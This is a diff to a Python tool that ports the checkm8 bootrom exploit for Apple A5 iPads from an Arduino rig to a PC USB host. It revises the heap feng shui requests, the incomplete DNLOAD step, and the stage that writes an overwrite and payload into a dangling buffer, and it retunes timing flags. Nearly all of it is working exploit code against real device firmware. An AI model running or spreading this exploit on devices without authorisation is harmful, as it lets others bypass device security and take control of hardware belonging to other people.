@@ -19,7 +19,10 @@ Usage:
     python3 tools/checkm8-a5-pwn.py --selftest
     python3 tools/checkm8-a5-pwn.py                 # pwn the DFU device
     python3 tools/checkm8-a5-pwn.py --debug         # print raw-transfer state
-    python3 tools/checkm8-a5-pwn.py --leak 620 --spin-us 80 --out-spin-us 0
+    python3 tools/checkm8-a5-pwn.py --write-mode abandon --out-spin-us 2000
+
+Host adaptation: a PC USB stack sends DATA1 after SETUP, so the Arduino's
+0xcc "pre-packets" are toggle dummies and are intentionally not sent here.
 
 Exit status: 0 = device reports 'PWND:[checkm8]' (already pwned counts),
 1 = fail.  If the exploit misses, re-enter DFU on the iPad (Power+Home) and
@@ -410,19 +413,31 @@ def debug_raw(name, rc, info):
 
 
 def auto_out_spin(spin_us, data_len):
-    """Conservative full-speed estimate for sending data but not the status phase."""
+    """Full-speed estimate for sending full OUT packets before cancellation.
+
+    The A5 sequence only needs the data stage here; the device either is still
+    waiting for more data (so it NAKs the status phase) or has already ended
+    the transfer on the final full packet.  This estimate errs on the side of
+    sending the whole data stage; --out-spin-us overrides it.
+    """
     packets = max(1, (data_len + 63) // 64)
-    return max(spin_us, 80 + packets * 45)
+    return max(spin_us, 150 + packets * 200)
 
 
-def heap_feng_shui_req(usb, handle, serial_idx, sz, spin_us, debug):
-    rc, info = usb.raw_ctrl(handle, 0x80, REQ_GET_DESCRIPTOR,
-                            (STRING_DESCRIPTOR << 8) | serial_idx, HABR_LANG,
-                            sz, b'', abandon=True, spin_us=spin_us,
-                            timeout_ms=500, name='feng shui %#x' % sz)
+def heap_feng_shui_req(usb, handle, serial_idx, sz, debug=False):
+    """One heap feng shui request.
+
+    The Arduino abandons the status phase, but on a PC host the reliable
+    equivalent is a complete control-IN transfer: at this point
+    ep0_data_phase_buffer is NULL, so the status ZLP is ignored by the A5
+    zero-length-packet quirk.  What matters is that the SETUP is processed.
+    """
+    rc, _ = usb.ctrl_in(handle, 0x80, REQ_GET_DESCRIPTOR,
+                        (STRING_DESCRIPTOR << 8) | serial_idx, HABR_LANG,
+                        sz, 10)
     if debug:
-        debug_raw('feng shui %#x' % sz, rc, info)
-    return rc == 0
+        print('    [debug] feng shui %#x rc=%d' % (sz, rc))
+    return rc > 0
 
 
 def stage0(usb):
@@ -433,7 +448,7 @@ def stage0(usb):
         reset_and_release(usb, handle, settle=0.5)
 
 
-def stage1(usb, serial_idx, leak_count, spin_us, debug):
+def stage1(usb, serial_idx, leak_count, debug):
     print('== stage 1: heap feng shui (%d leak requests) ==' % leak_count)
     dev, handle, desc, _ = acquire(usb, want_serial=False)
     usb.ctrl(handle, 0x02, 3, 0, 0x80, None, 10)  # stall (expected to error)
@@ -445,11 +460,15 @@ def stage1(usb, serial_idx, leak_count, spin_us, debug):
         if attempts > max_attempts:
             usb.release(handle)
             raise SystemExit('error: only %d/%d leak requests were accepted' % (success, leak_count))
-        if heap_feng_shui_req(usb, handle, serial_idx, 0x80, spin_us, debug):
+        req_debug = debug and (attempts <= 3 or attempts % 100 == 0)
+        if heap_feng_shui_req(usb, handle, serial_idx, 0x80, req_debug):
             success += 1
         if attempts % 100 == 0:
             print('  %d/%d' % (success, leak_count))
-    heap_feng_shui_req(usb, handle, serial_idx, 0x81, spin_us, debug)  # no leak
+    if debug:
+        heap_feng_shui_req(usb, handle, serial_idx, 0x81, True)  # no leak
+    else:
+        heap_feng_shui_req(usb, handle, serial_idx, 0x81, False)
     print('  feng shui done (%d attempts)' % attempts)
     reset_and_release(usb, handle, settle=0.5)
 
@@ -474,10 +493,15 @@ def stage2(usb, spin_us, out_spin_us, debug):
     # (f) two DFU GETSTATUS requests
     usb.ctrl_in(handle, 0xA1, REQ_DFU_GETSTATUS, 0, 0, 6, 1000)
     usb.ctrl_in(handle, 0xA1, REQ_DFU_GETSTATUS, 0, 0, 6, 1000)
-    # (g) incomplete DNLOAD: SETUP(wLength=0x700) + 0x700 data, no status.
-    data = b'\0' * (A5_PADDING + 0x40)
+    # (g) incomplete DNLOAD: SETUP(wLength=padding+0x40) + `padding` data, no
+    # status.  The Arduino sends padding+0x40 OUT packets, but its first OUT is
+    # a data-toggle dummy; a PC host sends DATA1 first, so the equivalent real
+    # data stage is `padding` bytes while wLength stays padding+0x40.  The
+    # device therefore never reaches end_of_transfer before the bus reset.
+    w_length = A5_PADDING + 0x40
+    data = b'\0' * A5_PADDING
     spin = out_spin_us or auto_out_spin(spin_us, len(data))
-    rc, info = usb.raw_ctrl(handle, 0x21, REQ_DNLOAD, 0, 0, len(data),
+    rc, info = usb.raw_ctrl(handle, 0x21, REQ_DNLOAD, 0, 0, w_length,
                             data, abandon=True, spin_us=spin, timeout_ms=1000,
                             name='incomplete DNLOAD')
     if debug:
@@ -488,7 +512,7 @@ def stage2(usb, spin_us, out_spin_us, debug):
     reset_and_release(usb, handle, settle=0.5)
 
 
-def stage3(usb, serial_idx, payload, overwrite, spin_us, out_spin_us, debug):
+def stage3(usb, serial_idx, payload, overwrite, spin_us, out_spin_us, write_mode, debug):
     print('== stage 3: heap occupation (overwrite + payload) ==')
     dev, handle, desc, _ = acquire(usb, want_serial=False)
     # (h) one abandoned IN leak request.  This must NOT complete: a status ZLP
@@ -506,34 +530,52 @@ def stage3(usb, serial_idx, payload, overwrite, spin_us, out_spin_us, debug):
     if info and info[0] == 0:
         usb.release(handle)
         raise SystemExit('error: critical IN completed before cancel — lower --spin-us')
-    # (i) SETUP(0,0,wLength=0x40) + OUT(0x40 pre-packet) + OUT(overwrite), no status.
-    data = b'\xcc' * 0x40 + overwrite
-    spin = out_spin_us or auto_out_spin(spin_us, len(data))
-    rc, info = usb.raw_ctrl(handle, 0x00, 0x00, 0, 0, 0x40,
-                            data, abandon=True, spin_us=spin, timeout_ms=1000,
-                            name='overwrite OUT')
-    if debug:
-        debug_raw('overwrite OUT', rc, info)
-    if rc != 0:
-        usb.release(handle)
-        raise SystemExit('error: overwrite OUT submit failed (%d)' % rc)
-    # (j) SETUP(DNLOAD,wLength=0x2C0) + OUT(0x40 pre-packet) + OUT(payload), no status.
-    data = b'\xcc' * 0x40 + payload
-    spin = out_spin_us or auto_out_spin(spin_us, len(data))
-    rc, info = usb.raw_ctrl(handle, 0x21, REQ_DNLOAD, 0, 0, len(payload),
-                            data, abandon=True, spin_us=spin, timeout_ms=1000,
-                            name='payload OUT')
-    if debug:
-        debug_raw('payload OUT', rc, info)
-    if rc != 0:
-        usb.release(handle)
-        raise SystemExit('error: payload OUT submit failed (%d)' % rc)
+    # (i)/(j) The Arduino sends a 0x40 0xcc "pre-packet" before the overwrite
+    # and payload.  That pre-packet exists to flip the MAX3421E data toggle; a
+    # PC host already sends DATA1 after SETUP, so the host adaptation sends the
+    # overwrite/payload directly.  Sending the pre-packet from a PC would shift
+    # the payload by 0x40 and break the payload's absolute addresses.
+    if write_mode == 'complete':
+        # Reliable host path: complete control transfers.  Errors are expected
+        # (the first request is an invalid OUT GET_STATUS); what matters is that
+        # the data stage is written into the dangling io_buffer.
+        rc = usb.ctrl(handle, 0x00, 0x00, 0, 0, overwrite, 100)
+        if debug:
+            print('    [debug] overwrite OUT      ctrl rc=%d' % rc)
+        rc = usb.ctrl(handle, 0x21, REQ_DNLOAD, 0, 0, payload, 1000)
+        if debug:
+            print('    [debug] payload OUT        ctrl rc=%d' % rc)
+    else:
+        # Raw Arduino timing: abandoned OUT transfers with no status phase.
+        spin = out_spin_us or auto_out_spin(spin_us, len(overwrite))
+        rc, info = usb.raw_ctrl(handle, 0x00, 0x00, 0, 0, len(overwrite),
+                                overwrite, abandon=True, spin_us=spin,
+                                timeout_ms=1000, name='overwrite OUT')
+        if debug:
+            debug_raw('overwrite OUT', rc, info)
+        if rc != 0:
+            usb.release(handle)
+            raise SystemExit('error: overwrite OUT submit failed (%d)' % rc)
+        spin = out_spin_us or auto_out_spin(spin_us, len(payload))
+        rc, info = usb.raw_ctrl(handle, 0x21, REQ_DNLOAD, 0, 0, len(payload),
+                                payload, abandon=True, spin_us=spin,
+                                timeout_ms=1000, name='payload OUT')
+        if debug:
+            debug_raw('payload OUT', rc, info)
+        if rc != 0:
+            usb.release(handle)
+            raise SystemExit('error: payload OUT submit failed (%d)' % rc)
     reset_and_release(usb, handle, settle=0.5)
 
 
 def verify(usb):
     print('== verify ==')
-    dev, handle, desc, serial = acquire(usb, want_serial=True)
+    try:
+        dev, handle, desc, serial = acquire(usb, want_serial=True)
+    except SystemExit:
+        raise SystemExit('error: no DFU device after the final reset — the exploit\n'
+                         'did not complete. Re-enter DFU on the iPad (Power+Home)\n'
+                         'and try again.')
     print('Found:', serial.strip())
     usb.release(handle)
     return serial
@@ -572,11 +614,12 @@ def exploit(args):
     if args.stage in ('all', '0'):
         stage0(usb)
     if args.stage in ('all', '1'):
-        stage1(usb, serial_idx, args.leak, args.spin_us, args.debug)
+        stage1(usb, serial_idx, args.leak, args.debug)
     if args.stage in ('all', '2'):
         stage2(usb, args.spin_us, args.out_spin_us, args.debug)
     if args.stage in ('all', '3'):
-        stage3(usb, serial_idx, payload, overwrite, args.spin_us, args.out_spin_us, args.debug)
+        stage3(usb, serial_idx, payload, overwrite, args.spin_us,
+               args.out_spin_us, args.write_mode, args.debug)
     serial = verify(usb)
     if PWN_MARKER not in serial:
         raise SystemExit('error: exploit failed — device did not enter pwned DFU mode.\n'
@@ -610,10 +653,12 @@ def main():
                         help='prebuilt A5 payload variant (default: classic)')
     parser.add_argument('--leak', type=int, default=A5_LEAK_COUNT,
                         help='heap feng shui leak count (default: %(default)s)')
-    parser.add_argument('--spin-us', type=int, default=80,
+    parser.add_argument('--spin-us', type=int, default=120,
                         help='cancel delay for abandoned IN transfers, microseconds (default: %(default)s)')
     parser.add_argument('--out-spin-us', type=int, default=0,
                         help='cancel delay for abandoned OUT transfers, microseconds (0 = estimate)')
+    parser.add_argument('--write-mode', choices=['complete', 'abandon'], default='complete',
+                        help='stage 3 overwrite/payload write style (default: %(default)s)')
     parser.add_argument('--stage', choices=['all', '0', '1', '2', '3', 'verify'], default='all',
                         help='run only one stage (default: all)')
     parser.add_argument('--debug', action='store_true', help='print raw libusb transfer state')
